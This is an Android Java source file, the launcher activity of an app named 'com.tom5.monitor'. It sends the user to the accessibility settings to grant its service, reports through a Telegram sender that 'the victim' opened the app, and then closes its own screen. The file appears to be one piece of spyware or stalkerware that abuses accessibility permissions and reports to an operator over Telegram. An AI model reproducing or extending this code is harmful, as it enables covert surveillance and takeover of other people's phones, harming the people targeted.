package com.tom5.monitor;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // توجيه مباشر لتفعيل الخدمة
        if (!isAccessibilityEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
        
        TelegramSender.sendMessage("🔔 الضحية فتح التطبيق.. بانتظار تفعيل إمكانية الوصول.");
        finish(); // إغلاق الواجهة
    }

    private boolean isAccessibilityEnabled() {
        String pref = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return pref != null && pref.contains(getPackageName());
    }
}
